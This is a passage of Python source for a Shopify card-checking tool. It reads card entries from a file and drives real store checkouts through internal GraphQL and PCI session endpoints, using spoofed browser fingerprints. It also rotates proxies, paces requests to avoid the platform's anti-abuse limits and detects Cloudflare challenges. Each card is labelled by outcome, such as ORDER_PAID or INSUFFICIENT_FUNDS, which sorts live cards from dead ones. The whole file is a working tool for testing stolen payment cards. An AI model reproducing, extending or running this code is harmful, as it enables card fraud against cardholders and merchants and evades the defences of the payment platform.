        "referer":              "https://checkout.pci.shopifyinc.com/build/a8e4a94/number-ltr.html?identifier=&locationURL=",
        "sec-ch-ua":            '"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"',
        "sec-ch-ua-mobile":     "?0",
        "sec-ch-ua-platform":   '"Windows"',
        "sec-fetch-dest":       "empty",
        "sec-fetch-mode":       "cors",
        "sec-fetch-site":       "same-origin",
        "sec-fetch-storage-access": "active",
        "shopify-identification-signature": ident_sig,
        "user-agent":           "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0",
    }

    with Session(impersonate="chrome124") as session:
        if proxy_url:
            session.proxies = {"http": proxy_url, "https": proxy_url}
        status, body = 0, ""
        for attempt in range(3):
            resp = session.post("https://checkout.pci.shopifyinc.com/sessions",
                                data=payload, headers=headers, timeout=12)
            status, body = resp.status_code, resp.text
            if 200 <= status < 300:
                break
            time.sleep(1.0 * (attempt + 1) + random.uniform(0, 0.3))
    return status, body

# ──────────────────────── Proposal helpers ───────────────────────────

def _proposal_headers(shop_url: str, checkout_url: str, checkout_token: str,
                      session_token: str, build_id: str, source_token: str) -> Dict:
    return {
        "accept":                        "application/json",
        "accept-language":               "en-US",
        "content-type":                  "application/json",
        "origin":                        shop_url,
        "priority":                      "u=1, i",
        "referer":                       checkout_url,
        "sec-ch-ua":                     '"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"',
        "sec-ch-ua-mobile":              "?0",
        "sec-ch-ua-platform":            '"Windows"',
        "sec-fetch-dest":                "empty",
        "sec-fetch-mode":                "cors",
        "sec-fetch-site":                "same-origin",
        "shopify-checkout-client":       "checkout-web/1.0",
        "shopify-checkout-source":       f'id="{checkout_token}", type="cn"',
        "user-agent":                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0",
        "x-checkout-one-session-token":  session_token,
        "x-checkout-web-build-id":       build_id,
        "x-checkout-web-deploy-stage":   "production",
        "x-checkout-web-server-handling":"fast",
        "x-checkout-web-server-rendering":"yes",
        "x-checkout-web-source-id":      source_token,
    }

# ──────────────────────── Step 4: Proposal 1 ─────────────────────────

def send_proposal(client: TLSClient, shop_url: str, checkout_url: str, checkout_token: str,
                  session_token: str, stable_id: str, variant_id: str, price: str,
                  proposal_id: str, build_id: str, source_token: str,
                  currency: str, country: str) -> Tuple[int, str]:

    gql_payload = f'''{{
  "variables": {{
    "sessionInput": {{"sessionToken": "{session_token}"}},
    "queueToken": null,
    "discounts": {{"lines": [], "acceptUnexpectedDiscounts": true}},
    "delivery": {{
      "deliveryLines": [{{
        "destination": {{
          "partialStreetAddress": {{
            "address1": "", "city": "", "countryCode": "US",
            "lastName": "", "phone": "", "oneTimeUse": false
          }}
        }},
        "selectedDeliveryStrategy": {{
          "deliveryStrategyMatchingConditions": {{
            "estimatedTimeInTransit": {{"any": true}},
            "shipments": {{"any": true}}
          }},
          "options": {{}}
        }},
        "targetMerchandiseLines": {{"any": true}},
        "deliveryMethodTypes": ["SHIPPING"],
        "expectedTotalPrice": {{"any": true}},
        "destinationChanged": true
      }}],
      "noDeliveryRequired": [],
      "useProgressiveRates": false,
      "prefetchShippingRatesStrategy": null,
      "supportsSplitShipping": true
    }},
    "deliveryExpectations": {{"deliveryExpectationLines": []}},
    "merchandise": {{
      "merchandiseLines": [{{
        "stableId": "{stable_id}",
        "merchandise": {{
          "productVariantReference": {{
            "id": "gid://shopify/ProductVariantMerchandise/{variant_id}",
            "variantId": "gid://shopify/ProductVariant/{variant_id}",
            "properties": [], "sellingPlanId": null, "sellingPlanDigest": null
          }}
        }},
        "quantity": {{"items": {{"value": 1}}}},
        "expectedTotalPrice": {{"any": true}},
        "lineComponentsSource": null, "lineComponents": []
      }}]
    }},
    "memberships": {{"memberships": []}},
    "payment": {{
      "totalAmount": {{"any": true}},
      "paymentLines": [],
      "billingAddress": {{
        "streetAddress": {{"address1": "", "city": "", "countryCode": "US", "lastName": "", "phone": ""}}
      }}
    }},
    "buyerIdentity": {{
      "customer": {{"presentmentCurrency": "USD", "countryCode": "US"}},
      "phoneCountryCode": "US",
      "marketingConsent": [],
      "shopPayOptInPhone": {{"countryCode": "US"}},
      "rememberMe": false
    }},
    "tip": {{"tipLines": []}},
    "poNumber": null,
    "taxes": {{
      "proposedAllocations": null,
      "proposedTotalAmount": {{"any": true}},
      "proposedTotalIncludedAmount": null,
      "proposedMixedStateTotalAmount": null,
      "proposedExemptions": []
    }},
    "note": {{"message": null, "customAttributes": []}},
    "localizationExtension": {{"fields": []}},
    "nonNegotiableTerms": null,
    "scriptFingerprint": {{
      "signature": null, "signatureUuid": null,
      "lineItemScriptChanges": [], "paymentScriptChanges": [], "shippingScriptChanges": []
    }},
    "optionalDuties": {{"buyerRefusesDuties": false}},
    "cartMetafields": []
  }},
  "operationName": "Proposal",
  "id": "{proposal_id}"
}}'''

    gql_payload = patch_payload(gql_payload, currency, country)
    resp = client.post(
        f"{shop_url}/checkouts/internal/graphql/persisted?operationName=Proposal",
        data=gql_payload,
        headers=_proposal_headers(shop_url, checkout_url, checkout_token, session_token, build_id, source_token)
    )
    return resp.status_code, resp.text

# ──────────────────────── Step 5: Proposal 2 (email) ─────────────────

def send_proposal2(client: TLSClient, shop_url: str, checkout_url: str, checkout_token: str,
                   session_token: str, stable_id: str, variant_id: str, price: str,
                   proposal_id: str, build_id: str, source_token: str, queue_token: str,
                   email: str, currency: str, country: str) -> Tuple[int, str]:

    gql_payload = f'''{{
  "variables": {{
    "sessionInput": {{"sessionToken": "{session_token}"}},
    "queueToken": "{queue_token}",
    "discounts": {{"lines": [], "acceptUnexpectedDiscounts": true}},
    "delivery": {{
      "deliveryLines": [{{
        "destination": {{
          "partialStreetAddress": {{
            "address1": "", "city": "", "countryCode": "US",
            "lastName": "", "phone": "", "oneTimeUse": false
          }}
        }},
        "selectedDeliveryStrategy": {{
          "deliveryStrategyMatchingConditions": {{
            "estimatedTimeInTransit": {{"any": true}},
            "shipments": {{"any": true}}
          }},
          "options": {{}}
        }},
        "targetMerchandiseLines": {{"any": true}},
        "deliveryMethodTypes": ["SHIPPING"],
        "expectedTotalPrice": {{"any": true}},
        "destinationChanged": true
      }}],
      "noDeliveryRequired": [],
      "useProgressiveRates": false,
      "prefetchShippingRatesStrategy": null,
      "supportsSplitShipping": true
    }},
    "deliveryExpectations": {{"deliveryExpectationLines": []}},
    "merchandise": {{
      "merchandiseLines": [{{
        "stableId": "{stable_id}",
        "merchandise": {{
          "productVariantReference": {{
            "id": "gid://shopify/ProductVariantMerchandise/{variant_id}",
            "variantId": "gid://shopify/ProductVariant/{variant_id}",
            "properties": [], "sellingPlanId": null, "sellingPlanDigest": null
          }}
        }},
        "quantity": {{"items": {{"value": 1}}}},
        "expectedTotalPrice": {{"any": true}},
        "lineComponentsSource": null, "lineComponents": []
      }}]
    }},
    "memberships": {{"memberships": []}},
    "payment": {{
      "totalAmount": {{"any": true}},
      "paymentLines": [],
      "billingAddress": {{
        "streetAddress": {{"address1": "", "city": "", "countryCode": "US", "lastName": "", "phone": ""}}
      }}
    }},
    "buyerIdentity": {{
      "customer": {{"presentmentCurrency": "USD", "countryCode": "US"}},
      "email": "{email}",
      "emailChanged": true,
      "phoneCountryCode": "US",
      "marketingConsent": [],
      "shopPayOptInPhone": {{"countryCode": "US"}},
      "rememberMe": false
    }},
    "tip": {{"tipLines": []}},
    "poNumber": null,
    "taxes": {{
      "proposedAllocations": null,
      "proposedTotalAmount": {{"any": true}},
      "proposedTotalIncludedAmount": null,
      "proposedMixedStateTotalAmount": null,
      "proposedExemptions": []
    }},
    "note": {{"message": null, "customAttributes": []}},
    "localizationExtension": {{"fields": []}},
    "nonNegotiableTerms": null,
    "scriptFingerprint": {{
      "signature": null, "signatureUuid": null,
      "lineItemScriptChanges": [], "paymentScriptChanges": [], "shippingScriptChanges": []
    }},
    "optionalDuties": {{"buyerRefusesDuties": false}},
    "cartMetafields": []
  }},
  "operationName": "Proposal",
  "id": "{proposal_id}"
}}'''

    gql_payload = patch_payload(gql_payload, currency, country)
    resp = client.post(
        f"{shop_url}/checkouts/internal/graphql/persisted?operationName=Proposal",
        data=gql_payload,
        headers=_proposal_headers(shop_url, checkout_url, checkout_token, session_token, build_id, source_token)
    )
    return resp.status_code, resp.text

# ──────────────────────── Step 6: Proposal 3 (address) ───────────────

def send_proposal3(client: TLSClient, shop_url: str, checkout_url: str, checkout_token: str,
                   session_token: str, stable_id: str, variant_id: str, price: str,
                   proposal_id: str, build_id: str, source_token: str, queue_token: str,
                   email: str, addr: Address, currency: str, country: str) -> Tuple[int, str]:

    gql_payload = f'''{{
  "variables": {{
    "sessionInput": {{"sessionToken": "{session_token}"}},
    "queueToken": "{queue_token}",
    "discounts": {{"lines": [], "acceptUnexpectedDiscounts": true}},
    "delivery": {{
      "deliveryLines": [{{
        "destination": {{
          "partialStreetAddress": {{
            "address1": "{addr.address1}",
            "address2": "{addr.address2}",
            "city": "{addr.city}",
            "countryCode": "{addr.country_code}",
            "postalCode": "{addr.postal_code}",
            "firstName": "{addr.first_name}",
            "lastName": "{addr.last_name}",
            "zoneCode": "{addr.zone_code}",
            "phone": "{addr.phone}",
            "oneTimeUse": false
          }}
        }},
        "selectedDeliveryStrategy": {{
          "deliveryStrategyMatchingConditions": {{
            "estimatedTimeInTransit": {{"any": true}},
            "shipments": {{"any": true}}
          }},
          "options": {{}}
        }},
        "targetMerchandiseLines": {{"any": true}},
        "deliveryMethodTypes": ["SHIPPING"],
        "expectedTotalPrice": {{"any": true}},
        "destinationChanged": true
      }}],
      "noDeliveryRequired": [],
      "useProgressiveRates": false,
      "prefetchShippingRatesStrategy": null,
      "supportsSplitShipping": true
    }},
    "deliveryExpectations": {{"deliveryExpectationLines": []}},
    "merchandise": {{
      "merchandiseLines": [{{
        "stableId": "{stable_id}",
        "merchandise": {{
          "productVariantReference": {{
            "id": "gid://shopify/ProductVariantMerchandise/{variant_id}",
            "variantId": "gid://shopify/ProductVariant/{variant_id}",
            "properties": [], "sellingPlanId": null, "sellingPlanDigest": null
          }}
        }},
        "quantity": {{"items": {{"value": 1}}}},
        "expectedTotalPrice": {{"any": true}},
        "lineComponentsSource": null, "lineComponents": []
      }}]
    }},
    "memberships": {{"memberships": []}},
    "payment": {{
      "totalAmount": {{"any": true}},
      "paymentLines": [],
      "billingAddress": {{
        "streetAddress": {{
          "address1": "{addr.address1}",
          "address2": "{addr.address2}",
          "city": "{addr.city}",
          "countryCode": "{addr.country_code}",
          "postalCode": "{addr.postal_code}",
          "firstName": "{addr.first_name}",
          "lastName": "{addr.last_name}",
          "zoneCode": "{addr.zone_code}",
          "phone": "{addr.phone}"
        }}
      }}
    }},
    "buyerIdentity": {{
      "customer": {{"presentmentCurrency": "USD", "countryCode": "US"}},
      "email": "{email}",
      "emailChanged": false,
      "phoneCountryCode": "US",
      "marketingConsent": [],
      "shopPayOptInPhone": {{"countryCode": "US"}},
      "rememberMe": false
    }},
    "tip": {{"tipLines": []}},
    "poNumber": null,
    "taxes": {{
      "proposedAllocations": null,
      "proposedTotalAmount": {{"any": true}},
      "proposedTotalIncludedAmount": null,
      "proposedMixedStateTotalAmount": null,
      "proposedExemptions": []
    }},
    "note": {{"message": null, "customAttributes": []}},
    "localizationExtension": {{"fields": []}},
    "nonNegotiableTerms": null,
    "scriptFingerprint": {{
      "signature": null, "signatureUuid": null,
      "lineItemScriptChanges": [], "paymentScriptChanges": [], "shippingScriptChanges": []
    }},
    "optionalDuties": {{"buyerRefusesDuties": false}},
    "cartMetafields": []
  }},
  "operationName": "Proposal",
  "id": "{proposal_id}"
}}'''

    gql_payload = patch_payload(gql_payload, currency, country)
    resp = client.post(
        f"{shop_url}/checkouts/internal/graphql/persisted?operationName=Proposal",
        data=gql_payload,
        headers=_proposal_headers(shop_url, checkout_url, checkout_token, session_token, build_id, source_token)
    )
    return resp.status_code, resp.text

# ──────────────────────── Step 10: SubmitForCompletion ───────────────

def send_poll_for_receipt(client: TLSClient, shop_url: str, checkout_url: str, checkout_token: str,
                          session_token: str, build_id: str, source_token: str,
                          poll_id: str, receipt_id: str, receipt_session_token: str) -> Tuple[int, str]:

    params   = {
        "operationName": "PollForReceipt",
        "variables":     json.dumps({"receiptId": receipt_id, "sessionToken": receipt_session_token}),
        "id":            poll_id,
    }
    full_url = f"{shop_url}/checkouts/internal/graphql/persisted?{urllib.parse.urlencode(params)}"

    headers  = _proposal_headers(shop_url, checkout_url, checkout_token, session_token, build_id, source_token)
    headers["x-checkout-web-source-id"] = checkout_token

    resp = client.get(full_url, headers=headers)
    return resp.status_code, resp.text

def send_submit_for_completion(client: TLSClient, shop_url: str, checkout_url: str, checkout_token: str,
                               session_token: str, stable_id: str, variant_id: str, price: str,
                               submit_id: str, build_id: str, source_token: str, queue_token: str,
                               email: str, addr: Address, delivery_handle: str, shipping_amount: str,
                               total_amount: str, pci_session_id: str, attempt_token: str,
                               currency: str, country: str, signed_handles: List[str],
                               is_digital: bool = False,
                               tax_amount: str = None,
                               total_any: bool = False,
                               payment_flexibility_terms_id: str = "") -> Tuple[int, str]:

    handle_lines       = [json.dumps({"signedHandle": h}) for h in (signed_handles or [])]
    signed_handles_json = "[" + ",".join(handle_lines) + "]"
    page_id            = generate_page_id()

    flex_line = ""
    if payment_flexibility_terms_id:
        flex_line = (',\n        "paymentFlexibilityTermsId": "'
                     + payment_flexibility_terms_id + '"')

    if is_digital or total_any:
        total_amount_block = '"totalAmount": {"any": true}'
    else:
        total_amount_block = f'"totalAmount": {{"value": {{"amount": "{total_amount}", "currencyCode": "USD"}}}}'

    if is_digital or total_any:
        amount_line = '"amount": {"any": true}'
    else:
        amount_line = f'"amount": {{"value": {{"amount": "{total_amount}", "currencyCode": "USD"}}}}'

    if is_digital:
        delivery_block = f'''
      "delivery": {{
        "deliveryLines": [{{
          "selectedDeliveryStrategy": {{
            "deliveryStrategyMatchingConditions": {{
              "estimatedTimeInTransit": {{"any": true}},
              "shipments": {{"any": true}}
            }},
            "options": {{}}
          }},
          "targetMerchandiseLines": {{"lines": [{{"stableId": "{stable_id}"}}]}},
          "deliveryMethodTypes": ["NONE"],
          "expectedTotalPrice": {{"any": true}},
          "destinationChanged": true
        }}],
        "noDeliveryRequired": [],
        "useProgressiveRates": false,
        "prefetchShippingRatesStrategy": null,
        "supportsSplitShipping": true
      }},
      "deliveryExpectations": {{"deliveryExpectationLines": []}}'''
    else:
        delivery_block = f'''
      "delivery": {{
        "deliveryLines": [{{
          "destination": {{
            "streetAddress": {{
              "address1": "{addr.address1}",
              "address2": "{addr.address2}",
              "city": "{addr.city}",
              "countryCode": "{addr.country_code}",
              "postalCode": "{addr.postal_code}",
              "firstName": "{addr.first_name}",
              "lastName": "{addr.last_name}",
              "zoneCode": "{addr.zone_code}",
              "phone": "{addr.phone}",
              "oneTimeUse": false
            }}
          }},
          "selectedDeliveryStrategy": {{
            "deliveryStrategyByHandle": {{
              "handle": "{delivery_handle}",
              "customDeliveryRate": false
            }},
            "options": {{}}
          }},
          "targetMerchandiseLines": {{"lines": [{{"stableId": "{stable_id}"}}]}},
          "deliveryMethodTypes": ["SHIPPING"],
          "expectedTotalPrice": {{"any": true}},
          "destinationChanged": false
        }}],
        "noDeliveryRequired": [],
        "useProgressiveRates": false,
        "prefetchShippingRatesStrategy": null,
        "supportsSplitShipping": true
      }},
      "deliveryExpectations": {{"deliveryExpectationLines": {signed_handles_json}}}'''

    tax_val   = tax_amount or "0.0"
    tax_block = f'"proposedTotalAmount": {{"value": {{"amount": "{tax_val}", "currencyCode": "USD"}}}}'

    gql_payload = f'''{{
  "variables": {{
    "input": {{
      "sessionInput": {{"sessionToken": "{session_token}"}},
      "queueToken": "{queue_token}",
      "discounts": {{"lines": [], "acceptUnexpectedDiscounts": true}},
      {delivery_block},
      "merchandise": {{
        "merchandiseLines": [{{
          "stableId": "{stable_id}",
          "merchandise": {{
            "productVariantReference": {{
              "id": "gid://shopify/ProductVariantMerchandise/{variant_id}",
              "variantId": "gid://shopify/ProductVariant/{variant_id}",
              "properties": [], "sellingPlanId": null, "sellingPlanDigest": null
            }}
          }},
          "quantity": {{"items": {{"value": 1}}}},
          "expectedTotalPrice": {{"any": true}},
          "lineComponentsSource": null, "lineComponents": []
        }}]
      }},
      "memberships": {{"memberships": []}},
      "payment": {{
        {total_amount_block},
        "paymentLines": [{{
          "paymentMethod": {{
            "directPaymentMethod": {{
              "sessionId": "{pci_session_id}",
              "billingAddress": {{
                "streetAddress": {{
                  "address1": "{addr.address1}",
                  "address2": "{addr.address2}",
                  "city": "{addr.city}",
                  "countryCode": "{addr.country_code}",
                  "postalCode": "{addr.postal_code}",
                  "firstName": "{addr.first_name}",
                  "lastName": "{addr.last_name}",
                  "zoneCode": "{addr.zone_code}",
                  "phone": "{addr.phone}"
                }}
              }},
              "cardSource": null
            }},
            "giftCardPaymentMethod": null,
            "redeemablePaymentMethod": null,
            "walletPaymentMethod": null,
            "walletsPlatformPaymentMethod": null,
            "localPaymentMethod": null,
            "paymentOnDeliveryMethod": null,
            "paymentOnDeliveryMethod2": null,
            "manualPaymentMethod": null,
            "customPaymentMethod": null,
            "offsitePaymentMethod": null,
            "customOnsitePaymentMethod": null,
            "deferredPaymentMethod": null,
            "customerCreditCardPaymentMethod": null,
            "paypalBillingAgreementPaymentMethod": null,
            "remotePaymentInstrument": null
          }},
          {amount_line}
        }}],
        "billingAddress": {{
          "streetAddress": {{
            "address1": "{addr.address1}",
            "address2": "{addr.address2}",
            "city": "{addr.city}",
            "countryCode": "{addr.country_code}",
            "postalCode": "{addr.postal_code}",
            "firstName": "{addr.first_name}",
            "lastName": "{addr.last_name}",
            "zoneCode": "{addr.zone_code}",
            "phone": "{addr.phone}"
          }}
        }}{flex_line}
      }},
      "buyerIdentity": {{
        "customer": {{"presentmentCurrency": "USD", "countryCode": "US"}},
        "email": "{email}",
        "emailChanged": false,
        "phoneCountryCode": "US",
        "marketingConsent": [],
        "shopPayOptInPhone": {{"countryCode": "US"}},
        "rememberMe": false
      }},
      "tip": {{"tipLines": []}},
      "poNumber": null,
      "taxes": {{
        "proposedAllocations": null,
        {tax_block},
        "proposedTotalIncludedAmount": null,
        "proposedMixedStateTotalAmount": null,
        "proposedExemptions": []
      }},
      "note": {{"message": null, "customAttributes": []}},
      "localizationExtension": {{"fields": []}},
      "nonNegotiableTerms": null,
      "scriptFingerprint": {{
        "signature": null, "signatureUuid": null,
        "lineItemScriptChanges": [], "paymentScriptChanges": [], "shippingScriptChanges": []
      }},
      "optionalDuties": {{"buyerRefusesDuties": false}},
      "cartMetafields": []
    }},
    "attemptToken": "{attempt_token}",
    "metafields": [],
    "analytics": {{
      "requestUrl": "{checkout_url}",
      "pageId": "{page_id}"
    }}
  }},
  "operationName": "SubmitForCompletion",
  "id": "{submit_id}"
}}'''

    gql_payload = patch_payload(gql_payload, currency, country)
    resp = client.post(
        f"{shop_url}/checkouts/internal/graphql/persisted?operationName=SubmitForCompletion",
        data=gql_payload,
        headers=_proposal_headers(shop_url, checkout_url, checkout_token, session_token, build_id, source_token)
    )
    return resp.status_code, resp.text

# ──────────────────────── Error checking ─────────────────────────────

def check_submit_errors(status: int, body: str):
    if status != 200:
        match = re.search(r'"__typename"\s*:\s*"(SubmitSuccess|SubmitAlreadyAccepted|SubmitFailed|SubmitThrottled)"', body)
        if match:
            typename = match.group(1)
            if typename != "SubmitSuccess":
                errors = re.findall(r'"code"\s*:\s*"([^"]+)"', body)
                raise Exception(f"Submit failed with {typename}: {errors if errors else 'Unknown error'}")
        else:
            error_msg = extract_any_error(body)
            if error_msg:
                raise Exception(f"Submit error: {error_msg}")
            else:
                raise Exception(f"Submit returned non-200 status: {status}")

# ──────────────────────── Card and proxy helpers ──────────────────────

class CardEntryError(Exception):
    """A card entry is malformed before any request is made."""


def parse_card_entry(card_entry: str) -> Tuple[str, int, int, str]:
    card_parts = card_entry.strip().split('|')
    if len(card_parts) != 4:
        raise CardEntryError(f"invalid card format in file: {card_entry}")

    try:
        card_month = int(card_parts[1])
        card_year = int(card_parts[2])
    except ValueError as e:
        raise CardEntryError(f"invalid card month/year in file: {e}")

    number, cvv = card_parts[0].strip(), card_parts[3].strip()

    if cvv:
        if not cvv.isdigit():
            raise CardEntryError(
                f"CVV must be digits for card {number[:6]}...{number[-4:]}, "
                f"got {len(cvv)} non-numeric character(s)")
        want = cvv_length_for_pan(number)
        if len(cvv) != want:
            brand = "Amex-style (34/37, 4 digits)" if want == 4 else "non-Amex (3 digits)"
            raise CardEntryError(
                f"CVV length {len(cvv)} does not match card "
                f"{number[:6]}...{number[-4:]}, which is {brand}")

    return number, card_month, card_year, cvv

def normalize_proxy(raw: str) -> str:
    """Accept every proxy shape the bot and the pools throw at us.

        user:pass@host:port      host:port               http://user:pass@host:port
        user pass host port      host port user pass     host:port:user:pass
        user:pass:host:port      user:pass host:port     socks5://user:pass@host:port

    Credentials are percent-encoded; a bare host:port stays unauthenticated.
    Raises on anything that cannot be read as host + numeric port.
    """
    p = (raw or "").strip()
    if not p:
        raise Exception("empty proxy")

    scheme = "http"
    m = re.match(r"^(https?|socks4|socks5)://", p, re.I)
    if m:
        scheme = m.group(1).lower()
        p = p[m.end():]

    p = p.strip().strip("\"'<>;, ").lstrip("@").strip()
    # v7/auto.py accepted '+' as a field separator ("user+pass+host+port");
    # only apply it when there is no '@' so a '+' inside a password survives.
    if "@" not in p and "+" in p:
        p = p.replace("+", ":")

    def _host_port(hp):
        hp = hp.strip().rstrip("/")
        if hp.startswith("[") and "]" in hp:                 # [v6]:port
            host, _, port = hp.partition("]")
            host, port = host.strip("[]"), port.lstrip(":")
            return (host, port) if host and port.isdigit() else None
        if hp.count(":") == 1:
            host, _, port = hp.partition(":")
            if host and port.isdigit():
                return host, port
        return None

    def _build(user, pwd, hostport):
        hp = _host_port(hostport)
        if not hp:
            raise Exception(f"invalid proxy format: {raw}")
        host, port = hp
        hostport = f"[{host}]:{port}" if ":" in host else f"{host}:{port}"
        if user:
            # unquote first: pools hand us already-encoded creds sometimes
            user = urllib.parse.unquote(user)
            pwd = urllib.parse.unquote(pwd or "")
            return (f"{scheme}://{urllib.parse.quote(user, safe='')}:"
                    f"{urllib.parse.quote(pwd, safe='')}@{hostport}")
        return f"{scheme}://{hostport}"

    # 1) userinfo@host:port
    if "@" in p:
        userinfo, _, hostport = p.rpartition("@")
        user, _, pwd = userinfo.partition(":")
        return _build(user, pwd, hostport)

    # 2) whitespace separated
    toks = [x for x in re.split(r"\s+", p) if x]
    if len(toks) == 4:
        a, b, c, d = toks

        def _port(x):
            return x.isdigit() and 0 < int(x) <= 65535

        def _host(x):
            return ("." in x) or x.startswith("[") or not x.isdigit()

        # A: host port user pass      B: user pass host port
        sa = int(_port(b) and _host(a)) + int("." in a)
        sb = int(_port(d) and _host(c)) + int("." in c)
        if sa >= sb and _port(b):
            return _build(c, d, f"{a}:{b}")
        if _port(d):
            return _build(a, b, f"{c}:{d}")
        raise Exception(f"invalid proxy format: {raw}")
    if len(toks) == 3:
        if _host_port(toks[0]):              # host:port user pass  (pattern C)
            return _build(toks[1], toks[2], toks[0])
        if _host_port(toks[2]):              # user pass host:port  (pattern D)
            return _build(toks[0], toks[1], toks[2])
        raise Exception(f"invalid proxy format: {raw}")
    if len(toks) == 2:
        if _host_port(toks[1]):              # user:pass host:port  (pattern B)
            user, _, pwd = toks[0].partition(":")
            return _build(user, pwd, toks[1])
        if _host_port(toks[0]):              # host:port user:pass
            user, _, pwd = toks[1].partition(":")
            return _build(user, pwd, toks[0])
        return _build("", "", toks[0])

    # 3) colon separated
    parts = p.split(":")
    if len(parts) == 2:                      # host:port
        return _build("", "", p)
    if len(parts) == 4:
        if parts[1].isdigit():               # host:port:user:pass
            return _build(parts[2], parts[3], f"{parts[0]}:{parts[1]}")
        return _build(parts[0], parts[1], f"{parts[2]}:{parts[3]}")  # user:pass:host:port

    # 4) last resort: bare host:port with a scheme that had no //
    return _build("", "", p)

# ──────────────────────── c3.py-style response mapping ───────────────

def _fmt(amount) -> str:
    """Format an amount as exactly 2 decimals (c3.py parity)."""
    if not amount:
        return "0"
    try:
        return f"{float(amount):.2f}"
    except (ValueError, TypeError):
        return str(amount)


def _fmt_card(card: str) -> str:
    parts = str(card or "").strip().split("|")
    return "|".join(parts[:4])


def _result_code(result: CheckResult) -> str:
    """c3.py-parity ``_map_code`` for a CheckResult."""
    code = (result.status_code or "").strip()
    if code:
        return code
    status = (getattr(result.status, "name", "") or "").upper()
    low = str(result.error or "").lower()
    if "no cheap" in low or "no available products" in low or "discovery" in low:
        return "NO_PRODUCTS"
    if "cart" in low or "checkout" in low or "token" in low:
        return "CART_ERROR"
    if "proposal" in low:
        return "PROPOSAL_ERROR"
    if "pci" in low:
        return "PCI_ERROR"
    if "submit" in low:
        return "SUBMIT_ERROR"
    if "poll" in low or "timeout" in low:
        return "POLL_TIMEOUT"
    if status == "CHARGED":
        return "ORDER_PAID"
    if status == "THREE_DS":
        return "3DS_REQUIRED"
    if status == "DECLINED":
        return "CARD_DECLINED"
    if status == "APPROVED":
        return "APPROVED"
    return "ERROR"


def to_response_dict(result: CheckResult, variant=None, proxy=None) -> Dict[str, str]:
    """Render a CheckResult exactly like c3.py's Flask ``_respond`` JSON.

    Keys: CC, Currency, Gateway, Price, Proxy, Response, Status. ``Status`` is
    the string "true" only for INSUFFICIENT_FUNDS / ORDER_PAID.
    """
    code = _result_code(result)
    status = (getattr(result.status, "name", "") or "").upper()
    if status == "CHARGED":
        response = "ORDER_PAID"
    elif status == "APPROVED":
        response = code or "APPROVED"
    elif status == "DECLINED":
        response = "CARD_DECLINED" if code == "CAPTCHA_REQUIRED" else (code or "CARD_DECLINED")
    else:
        response = code
    if response == "CAPTCHA_REQUIRED":
        response = "CARD_DECLINED"
    status_str = "true" if response in ("INSUFFICIENT_FUNDS", "ORDER_PAID") else "false"

    price = result.amount
    if not price and variant is not None:
        price = variant.get("price") if isinstance(variant, dict) else getattr(variant, "price", "")

    return {
        "CC": _fmt_card(result.card),
        "Currency": result.currency or "USD",
        "Gateway": result.gateway or "shopify_payments",
        "Price": _fmt(price),
        "Proxy": "Live" if (result.proxy or proxy) else "None",
        "Response": response,
        "Status": status_str,
    }


# ──────────────────────── Pacing & proxy lanes (c3.py parity) ────────

_SHOP_PACE: Dict[str, float] = {}
_SHOP_PACE_INTERVAL = 0.9


def _pace(shop_url: str):
    """Space repeat hits to the same shop so bursts don't trip Shopify's wall."""
    now = time.time()
    last = _SHOP_PACE.get(shop_url, 0)
    wait = _SHOP_PACE_INTERVAL - (now - last)
    if wait > 0:
        time.sleep(wait)
    _SHOP_PACE[shop_url] = time.time()


_PCI_LANE_LOCK = threading.Lock()
_PCI_COOLDOWN: Dict[str, float] = {}
_PCI_BURN_COUNT: Dict[str, int] = {}
PCI_BURN_SECONDS = 180
_ALIVE_RING: List[tuple] = []


def _lane_key(pxy):
    return pxy or "DIRECT"


def _lane_cooling(pxy) -> bool:
    until = _PCI_COOLDOWN.get(_lane_key(pxy))
    return bool(until and time.time() < until)


def _lane_burn(pxy, seconds=None):
    key = _lane_key(pxy)
    cnt = _PCI_BURN_COUNT.get(key, 0) + 1
    _PCI_BURN_COUNT[key] = cnt
    if seconds is None:
        seconds = PCI_BURN_SECONDS
        if cnt >= 4:
            seconds = 3600
        elif cnt >= 2:
            seconds = 600
    _PCI_COOLDOWN[key] = time.time() + seconds


def _lane_recovered(pxy):
    _PCI_BURN_COUNT.pop(_lane_key(pxy), None)


def _remember_alive(p):
    if not p:
        return
    with _PCI_LANE_LOCK:
        _ALIVE_RING.append((p, time.time()))
        while len(_ALIVE_RING) > 60:
            _ALIVE_RING.pop(0)


def _is_challenge_html(body: str) -> bool:
    b = (body or "").lstrip().lower()
    return (b.startswith("<!doctype") or b.startswith("<html")
            or "verifying your connection" in b or "cf-chl-" in b
            or ("challenge" in b[:300] and '"id"' not in b))


def _proxy_ok(proxy: str, probe_url: str, timeout: float = 2) -> bool:
    """Cheap liveness probe for a proxy lane (c3.py parity)."""
    try:
        with Session(impersonate="chrome124") as s:
            if proxy:
                s.proxies = {"http": proxy, "https": proxy}
            r = s.get(probe_url, timeout=timeout)
            return r.status_code < 500
    except Exception:
        return False


# ──────────────────────── Legacy checkout fallback ───────────────────

def legacy_checkout(shop_url: str, card_entry: str, proxy_url: str = "") -> CheckResult:
    """Classic non-persisted checkout (c3.py parity) -> CheckResult.

    cart/add.js -> authenticity_token -> PATCH contact/shipping/payment ->
    legacy vault session -> final PATCH -> verdict. Used as a fallback when the
    persisted GraphQL pipeline faults before any card verdict is reached.
    """
    site_name = shop_url.replace("https://", "").replace("http://", "").split("/")[0]
    result = CheckResult(card=card_entry, shop_url=shop_url, site_name=site_name,
                         currency="USD", proxy=proxy_url, status=CheckStatus.ERROR)
    try:
        number, month, year, cvv = parse_card_entry(card_entry)
    except Exception as e:
        result.error = e
        return result

    proxy_url = normalize_proxy(proxy_url) if (proxy_url or "").strip() else ""
    email = generate_random_email()
    addr = address_for_country("US")
    full_name = f"{addr.first_name} {addr.last_name}".title()

    client = TLSClient(timeout=12, proxy_url=proxy_url)
    try:
        # 0. pick a variant
        try:
            variant = find_cheapest_product(client, shop_url)
            variant_id = variant[2]
        except Exception as e:
            result.error = Exception(f"legacy discovery: {e}")
            return result

        # 1. add to cart
        r1 = client.post(f"{shop_url}/cart/add.js",
                         data={"id": variant_id, "quantity": 1},
                         headers={"x-requested-with": "XMLHttpRequest",
